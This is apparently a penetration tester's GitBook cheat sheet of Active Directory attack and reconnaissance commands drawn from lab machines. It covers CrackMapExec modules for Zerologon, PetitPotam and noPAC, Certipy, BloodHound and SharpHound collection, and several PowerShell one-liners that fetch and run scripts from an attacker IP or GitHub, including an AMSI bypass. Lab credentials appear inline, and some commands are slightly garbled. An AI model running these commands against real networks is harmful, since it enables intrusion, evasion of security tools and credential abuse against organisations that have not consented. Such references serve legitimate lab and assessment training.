# AD Attack Recon

## Enumeration Tools

### CrackMapExec

```bash
# Zerologon
crackmapexec smb $RHOST -u '' -p '' -M zerologon

# PetitPotam
crackmapexec smb $RHOST -u '' -p '' -M petitpotam

# noPAC
crackmapexec smb $RHOST -u 'user' -p 'pass' -M nopa
# You need a credential for this one
```

### adPEAS&#x20;

{% code overflow="wrap" %}
```bash
# You need a credential to run adPEAS. 

# Bypass ASMI 
IEX (new-Object Net.WebClient).DownloadString('http://10.0.0.181/privesc/amsi.txt')
IEX (new-Object Net.WebClient).DownloadString('http://10.0.0.181/privesc/my-am-bypass.ps1')

# Import adPEAS
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.181/privesc/adPEAS.ps1')

# Run the adPEAS
Invoke-adPEAS -Domain 'contoso.com' -Server 'dc1.contoso.com' -Username 'contoso\johndoe' -Password 'Passw0rd1!' -Force

# gMSA account (service account such as svc_apache$) 
Invoke-adPEAS -Domain 'heist.offsec' -Server 'dc01.heist.offsec' -Username 'heist.offsec\enox' -Password 'california' -Force -Module Creds
```
{% endcode %}

### Certipy

Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS)

{% code overflow="wrap" %}
```bash
# Update Certipy
Kali> python3 -m venv venv
Kali> source venv/bin/activate.fish
Kali> pip3 install certipy-ad
Kali> venv/bin/certipy --version
Certipy v4.8.2 - by Oliver Lyak (ly4k) # as of 01/12/2024 

# Find ADCS related vulnerabilities

kali> venv/bin/certipy find -u Raven -p R4v3nBe5tD3veloP3r!123 -target manager.htb -text -stdout -vulnerable

# This will save it as Bloodhound data
Kali> venv/bin/certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.133.85

# Go to the site and attack the ADCS. 
https://github.com/ly4k/Certipy
```
{% endcode %}

### Bloodhound

#### Server side

{% code overflow="wrap" %}
```bash
sudo service neo4j start
sudo neo4j console
# will initiate the site, http://localhost:7474/ 
bloodhound &
# id: neo4j
# password: bloodhound (default password was neo4j) 
```
{% endcode %}

#### Client side

{% code overflow="wrap" %}
```bash
# Kali 

# Ensure you configure DC FQDN name in host file such as dc01.blackfield.local 
cme ldap $RHOST -u library -p library --bloodhound -ns $RHOST -c all

bloodhound.py -u 'support' -p '#00^BlackKnight' -v --zip -c All -ns 10.129.157.228 -d blackfield.local -dc dc01.blackfield.local 

bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11  


# Kali with Kerberos authentication 
bloodhound.py -k -u m.lovegod -p AbsoluteLDAP2022! --auth-method kerberos -d absolute.htb -dc dc.absolute.htb -ns 10.129.228.64 --dns-tcp --zip -c All

# At Windows
cmd> .\SharpHound.exe --CollectionMethods All --ZipFileName output.zip
cmd> .\SharpHound.exe --domain THROWBACK.local --domaincontroller 10.200.74.117 --ldapusername "BlaireJ" --ldappassword "7eQgx6YzxgG3vC45t5k9" --CollectionMethods Group,LocalGroup,GPOLocalGroup,Session,LoggedOn,ObjectProps,ACL,ComputerOnly,Trusts,Default,RDP,DCOM,DCOnly

# With Powershell
cmd >powershell -ev bypass
ps>. .\SharpHound.ps1
ps> Invoke-BloodHound -CollectionMethod All -Domain Controller.local -zipFileName dc.zip

# Connect from a non domain joined system. DNS should be pointing to DC. 
cmd> runas /netonly /user:BORDERGATE\Alice cmd.exe
cmd> SharpHound.exe -d bordergate.local 
```
{% endcode %}

### Invoke-AdEnum

{% code overflow="wrap" %}
```powershell
PS> IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1);Invoke-ADEnum
```
{% endcode %}

### PowerUpSQL

{% code overflow="wrap" %}
```powershell
PS> IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
```
{% endcode %}

### Pyverview

```
https://github.com/the-useless-one/pywerview
```
